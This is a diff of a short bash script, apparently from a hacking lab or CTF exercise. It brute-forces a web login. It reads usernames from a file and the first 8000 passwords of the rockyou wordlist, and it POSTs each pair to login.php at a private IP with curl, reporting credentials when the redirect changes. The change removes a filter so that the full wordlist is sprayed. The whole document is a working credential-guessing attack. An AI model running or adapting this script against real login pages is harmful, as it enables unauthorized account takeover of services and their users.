@@ -5,7 +5,7 @@ contrasenia_valida=""
 
 for user in $(cat usuarios); do
 
-	for password in $(cat /usr/share/wordlists/rockyou.txt | head -n 8000 | grep "fernando1"); do
+	for password in $(cat /usr/share/wordlists/rockyou.txt | head -n 8000); do
 		state=$(curl -s -v -X POST "http://192.168.146.139/login.php" -d "username=$user" -d "password=$password" 2>&1 | grep "location" | awk '{print $3}')
 		if [ $state != "index.php"  ]; then
 			echo "[+] Credenciales encontradas!"
